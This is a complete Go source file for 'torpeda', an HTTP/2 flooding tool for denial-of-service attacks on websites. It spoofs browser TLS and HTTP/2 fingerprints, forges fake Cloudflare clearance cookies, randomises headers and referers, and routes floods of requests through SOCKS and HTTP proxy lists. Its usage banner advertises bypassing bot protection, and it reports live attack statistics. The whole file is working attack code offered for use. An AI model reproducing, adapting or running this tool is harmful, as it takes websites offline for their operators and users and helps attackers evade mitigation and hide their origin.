package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sort"
	"time"

	http "github.com/bogdanfinn/fhttp"
	tls "github.com/bogdanfinn/utls"
	"github.com/bogdanfinn/fhttp/http2"
	"github.com/panjf2000/ants/v2"
	"h12.io/socks"
)

var supportedVersions = []uint16{
	0xfafa,           // GREASE
	tls.VersionTLS13, // TLS 1.3
	tls.VersionTLS12, // TLS 1.2
}

var cipherSuites = []uint16{
	0x3a3a, // GREASE
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_AES_128_GCM_SHA256,
}

var supportedGroups = []tls.CurveID{
	tls.X25519,    // 0x001d
	tls.CurveP256, // 0x0017 (secp256r1)
	tls.CurveP384, // 0x0018 (secp384r1)
}

var (
	reqmethod     string
	target        string
	duration      int
	threads       int
	rps           float64
	proxies       = []string{}
	proxyFile     string
	debug         bool
	extra         bool
	closeConn     bool
	test          bool
	redirect      bool
	parsed        bool
	cf            bool
	cookies       = ""
	refererURL string
	customCookie  string
	customUserAgent string
	connectionFlow = uint32(15663105)
	statusMap      = make(map[int]int)
	statusMutex    sync.Mutex
	customHeaders  = make(map[string]string)
)

var randomReferers = []string{
	"https://google.com",
	"https://bing.com",
	"https://yahoo.com",
	"https://duckduckgo.com",
	"https://youtube.com",
	"https://vk.com",
	"https://x.com",
	"https://github.com",
	"https://dzen.ru",
	"https://instagram.com",
	"https://tiktok.com",
	"https://wikipedia.org",
	"https://chatgpt.com",
	"https://reddit.com",
	"https://amazon.com",
}

var (
	pseudoHeaderOrder = []string{":method", ":authority", ":scheme", ":path"}
	settingsFrame = map[http2.SettingID]uint32{
		http2.SettingHeaderTableSize:   65536,
		http2.SettingEnablePush:        0,
		http2.SettingInitialWindowSize: 6291456,
		http2.SettingMaxHeaderListSize: 262144,
	}
	settingsFrameOrder = []http2.SettingID{
		http2.SettingHeaderTableSize,
		http2.SettingEnablePush,
		http2.SettingInitialWindowSize,
		http2.SettingMaxHeaderListSize,
	}
)

func main() {
	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
	if len(os.Args) < 7 {
	fmt.Print("\033[H\033[2J")
	fmt.Println(`	[flooder - golang] torpeda v0.3 // Updated: 06.11.2024 // Made with love :D
	Developers to method: mitigations aka @rapidreset
	Features: bypass BFM, many options, support %RAND% in target, support rate like 4.7, support http/socks proxy
	How to use & example:

	go run h2pivo.go <reqmethod> <target> <time> <threads> <ratelimit> <proxyfile>
	go run h2pivo.go GET "https://target.com" 120 16 128 proxy.txt

	Options:
	--debug - For display status ur codes from proxies (recommend / maybe low rps to use more resource)
	--extra - For additional headers (recommend)
	--test - For display html content with proxy
	--redirect - For sites who has redirect system using status codes like: 301, 302, 307, 308 
	--parsed - For sites that use Set-cookie for protection (recommend)
	--cookie "<string>" - For custom cookie and also cookie support %RAND% ex: "pizdec=%RAND%"
	--header "<string>" - For custom headers split each header with # ex: "f:f" or "f:f#f1:f1"
	--referer "<string> or rand" - For custom referer ex: "https://www.google.com" (recommend rand)
	--ua "<string>" - For custom useragent ex: "curl/4.0"
	--cf - For sites who has protection based on check cf_clearence cookies
	 `)
	return
}

	reqmethod = os.Args[1]
	target = os.Args[2]
	duration, _ = strconv.Atoi(os.Args[3])
	threads, _ = strconv.Atoi(os.Args[4])
	rps, _ = strconv.ParseFloat(os.Args[5], 64)
	proxyFile = os.Args[6]

	if !contains(validMethods, reqmethod) {
		fmt.Println("[#1] Invalid request method")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "https://") && !strings.HasPrefix(target, "http://") {
		fmt.Println("[#2] Target must start with https:// or http://")
		os.Exit(1)
	}

	if duration < 1 || duration > 86400 {
		fmt.Println("[#3] Time must be between 1 and 86400 seconds")
		os.Exit(1)
	}

	if threads < 1 || threads > 512 {
		fmt.Println("[#4] Threads must be between 1 and 512")
		os.Exit(1)
	}

	if rps < 0.1 || rps > 128 {
		fmt.Println("[#5] Ratelimit must be between 0.1 and 128")
		os.Exit(1)
	}

	for i := 0; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--debug":
			debug = true
		case "--extra":
			extra = true
		case "--test":
			test = true
		case "--redirect":
			redirect = true
		case "--parsed":
			parsed = true
		case "--header":
			if i+1 < len(os.Args) {
				parseCustomHeaders(os.Args[i+1])
			}
		case "--cookie":
			if i+1 < len(os.Args) {
				customCookie = os.Args[i+1]
			}
		case "--ua":
			if i+1 < len(os.Args) {
				customUserAgent = os.Args[i+1]
			}
		case "--referer":
			if i+1 < len(os.Args) {
				refererURL = os.Args[i+1]
			}
		}
	}

	readProxies()

	fmt.Println("Attack started!")

	if debug {
		go printStatuses()
	}

	p, _ := ants.NewPool(threads)
	defer p.Release()

	for i := 0; i < threads; i++ {
		p.Submit(func() {
			for _, proxy := range proxies {
				go start(proxy)
			}
		})
	}

	time.Sleep(time.Duration(duration) * time.Second)
}

func parseCustomHeaders(headers string) {
	headerPairs := strings.Split(headers, "#")
	for _, pair := range headerPairs {
		parts := strings.SplitN(pair, ":", 2)
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			if key != "" && value != "" {
				customHeaders[key] = value
			}
		}
	}
}

func detectProxyType(proxy string) string {
	if strings.HasPrefix(proxy, "socks5://") {
		return "socks5"
	} else if strings.HasPrefix(proxy, "socks4://") {
		return "socks4"
	} else if strings.HasPrefix(proxy, "https://") {
		return "https"
	} else if strings.HasPrefix(proxy, "http://") {
		return "http"
	}

	if strings.Contains(proxy, ":") {
		return "http"
	}

	return "http"
}

func randstr(length int) string {
	const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	var result strings.Builder
	charactersLength := len(characters)
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < length; i++ {
		randomIndex := rand.Intn(charactersLength)
		result.WriteByte(characters[randomIndex])
	}

	return result.String()
}

func timestampString() string {
	return strconv.FormatInt(time.Now().Unix(), 10)
}

func Cloudflarecookie() string {
	cookieValue := fmt.Sprintf(`cf_clearance=%s.%s-%s-1.2.1.1-%s.%s.%s_%s_%s_%s_%s.%s`,
		randstr(19),
		randstr(23),
		timestampString(),
		randstr(108),
		randstr(21),
		randstr(11),
		randstr(12),
		randstr(201),
		randstr(6),
		randstr(20),
		randstr(20),
	)
	return cookieValue
}

func parseCookies(resp *http.Response) {
	uniqueCookies := make(map[string]string)

	setCookies := resp.Header["Set-Cookie"]
	if len(setCookies) > 0 {
		for _, cookie := range setCookies {
			cookieParts := strings.Split(cookie, ";")[0]
			cookieName := strings.Split(cookieParts, "=")[0]

			if _, exists := uniqueCookies[cookieName]; !exists {
				uniqueCookies[cookieName] = cookieParts
			}
		}

		cookies = ""
		for _, cookieValue := range uniqueCookies {
			if cookies == "" {
				cookies = cookieValue
			} else {
				cookies += "; " + cookieValue
			}
		}

		if debug {
			fmt.Println("Cookies: ", cookies)
		}
	}
}

func randomHeader() http.Header {
	header := http.Header{
		"cache-control":             []string{"max-age=0"},
		"sec-ch-ua":                 []string{`"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"`},
		"sec-ch-ua-mobile":          []string{"?0"},
		"sec-ch-ua-platform":        []string{`"Windows"`},
		"upgrade-insecure-requests": []string{"1"},
		"accept":                    []string{`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`},
		"sec-gpc":                   []string{"1"},
		"accept-language":           []string{"en-US,en;q=0.7"},
		"sec-fetch-mode":            []string{"navigate"},
		"sec-fetch-user":            []string{"?1"},
		"sec-fetch-dest":            []string{"document"},
		"accept-encoding":           []string{"gzip, deflate, br, zstd"},
		"priority":                  []string{"u=0, i"},
	}

	if customUserAgent != "" {
		header.Set("user-agent", customUserAgent)
	} else {
		header.Set("user-agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36`)
	}

	rand.Seed(time.Now().UnixNano())
	if rand.Float64() < 0.43 {
		header.Set("dnt", "1")
	}

	if reqmethod != "POST" {
        header.Set("content-length", "0")
    }

	if refererURL == "rand" {
		rand.Seed(time.Now().UnixNano())
		header.Set("referer", randomReferers[rand.Intn(len(randomReferers))])
	} else if refererURL != "" {
        header.Set("referer", refererURL)
    }

    ref := []string{"same-site", "same-origin", "cross-site"}
    rand.Seed(time.Now().UnixNano())
    secFetchSite := ref[rand.Intn(len(ref))]
    header.Set("sec-fetch-site", secFetchSite)

	if cf {
		cloudflareCookie := Cloudflarecookie()
		header.Set("Cookie", cloudflareCookie)
	}

	for key, value := range customHeaders {
		header.Set(key, value)
	}

	header[http.HeaderOrderKey] = []string{
		"cache-control",
		"sec-ch-ua",
		"sec-ch-ua-mobile",
		"sec-ch-ua-platform",
		"upgrade-insecure-requests",
		"user-agent",
		"accept",
		"sec-gpc",
		"accept-language",
		"sec-fetch-site",
		"sec-fetch-mode",
		"sec-fetch-user",
		"sec-fetch-dest",
		"accept-encoding",
		"priority",
	}

	return header
}

func readProxies() {
	file, err := os.Open(proxyFile)
	if err != nil {
		log.Fatalf("[#6] Problem in proxyfile: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func processCustomCookie(cookie string) string {
	return strings.ReplaceAll(cookie, "%RAND%", randstr(10))
}

func ResponseBody(resp *http.Response) {
	const maxSize = 128 * 1
	limitedReader := io.LimitReader(resp.Body, maxSize)

	if _, err := io.Copy(ioutil.Discard, limitedReader); err != nil {
		return
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	pageContent := string(bodyBytes)
	fmt.Println(pageContent)
}

func createRatePattern(rps float64) []time.Duration {
	intervals := []time.Duration{}
	intPart := int(rps)
	fracPart := rps - float64(intPart)

	for i := 0; i < intPart; i++ {
		intervals = append(intervals, time.Second/time.Duration(intPart))
	}

	if fracPart > 0 {
		extraInterval := time.Duration(float64(time.Second) * fracPart)
		intervals = append(intervals, extraInterval)
	}

	return intervals
}

func start(proxy string) {
    proxyType := detectProxyType(proxy)

    if proxyType == "http" || proxyType == "https" {
        if !strings.HasPrefix(proxy, "http://") && !strings.HasPrefix(proxy, "https://") {
            proxy = "http://" + proxy
        }
    }

    proxyClean := strings.TrimPrefix(proxy, proxyType+"://")

    var transport *http.Transport

    if proxyType == "socks5" || proxyType == "socks4" {
        dialSocksProxy := socks.Dial(fmt.Sprintf("%s://%s", proxyType, proxyClean))
        transport = &http.Transport{
            Dial: dialSocksProxy,
        }
    } else if proxyType == "http" || proxyType == "https" {
        proxyURL, err := url.Parse(proxy)
        if err != nil {
            return
        }
        transport = &http.Transport{
            Proxy: http.ProxyURL(proxyURL),
        }
    }

    currentTarget := strings.ReplaceAll(target, "%RAND%", randstr(10))
    parsedURL, err := url.Parse(currentTarget)
    if err != nil {
        fmt.Println("Error parsing target URL:", err)
        os.Exit(1)
    }

    var tlsConfig = &tls.Config{
        ServerName:               parsedURL.Host,
        MinVersion:               supportedVersions[len(supportedVersions)-1],
        MaxVersion:               supportedVersions[0],
        CurvePreferences:         supportedGroups,
        CipherSuites:             cipherSuites,
        ClientSessionCache:       tls.NewLRUClientSessionCache(0),
        NextProtos:               []string{"h2", "http/1.1"},
        PreferServerCipherSuites: false,
        InsecureSkipVerify:       true,
    }

    transport.ForceAttemptHTTP2 = true
    transport_http2, err := http2.ConfigureTransports(transport)
    if err != nil {
        return
    }

    transport_http2.Settings = settingsFrame
    transport_http2.SettingsOrder = settingsFrameOrder
    transport_http2.PseudoHeaderOrder = pseudoHeaderOrder
    transport_http2.ConnectionFlow = connectionFlow
    transport.H2transport = transport_http2
    transport.TLSClientConfig = tlsConfig

    client := &http.Client{
        Timeout:   time.Second * 10,
        Transport: transport,
    }

    if redirect {
        client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
            if len(via) >= 10 {
                return http.ErrUseLastResponse
            }
            if debug {
                log.Printf("Redirect %s", req.URL.String())
            }
            return nil
        }
    }

    req, err := http.NewRequest(reqmethod, currentTarget, nil)
    if err != nil {
        return
    }

    req.Header = randomHeader()

    if customCookie != "" {
        processedCookie := processCustomCookie(customCookie)
        req.Header.Set("Cookie", processedCookie)
    }

    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()

    if parsed {
        parseCookies(resp)
    }

    if test {
        ResponseBody(resp)
    }

    ratePattern := createRatePattern(rps)
    var wg sync.WaitGroup

    for _, interval := range ratePattern {
        ticker := time.NewTicker(interval)
        defer ticker.Stop()

        wg.Add(1)
        go func() {
            defer wg.Done()
            for range ticker.C {
                currentTarget := strings.ReplaceAll(target, "%RAND%", randstr(10))
                req.URL, _ = url.Parse(currentTarget)

                resp, err := client.Do(req)
                if err != nil {
                    continue
                }
                updateStatusMap(resp.StatusCode)
                resp.Body.Close()
            }
        }()
        time.Sleep(time.Second)
    }
    wg.Wait()
}

func updateStatusMap(statusCode int) {
	statusMutex.Lock()
	defer statusMutex.Unlock()
	statusMap[statusCode]++
}

func printStatuses() {
	startTime := time.Now()
	totalRequests := 0

	for debug {
		time.Sleep(time.Second)
		statusMutex.Lock()

		fmt.Print("\033[H\033[2J")
		fmt.Println("> Attack Informations:")
		fmt.Println("> Version: v0.3")
		fmt.Println("> Request Method:", reqmethod)
		fmt.Println("> Target:", target)
		fmt.Println("> Time:", duration)
		fmt.Println("> Threads:", threads)
		fmt.Println("> Ratelimit:", rps)

		currentTime := time.Now()
		elapsedTime := currentTime.Sub(startTime).Seconds()
		averageRPS := float64(totalRequests) / elapsedTime
		remainingTime := float64(duration) - elapsedTime

		if remainingTime < 0 {
			remainingTime = 0
		}
	
		var codes []int
		for code := range statusMap {
			codes = append(codes, code)
		}
		sort.Ints(codes)

		fmt.Println(`[-] Detailed Options [-]`)

		statusString := "Status Codes:"
		for _, code := range codes {
			statusString += fmt.Sprintf(" [%d: %d]", code, statusMap[code])
		}

		fmt.Printf("%s\n", statusString)
		fmt.Printf("Average Requests: %.2f Per Second\n", averageRPS)
		fmt.Printf("Attack End After: %.f Seconds\n", remainingTime)

		for _, count := range statusMap {
			totalRequests += count
		}
		statusMap = make(map[int]int)

		statusMutex.Unlock()
	}
}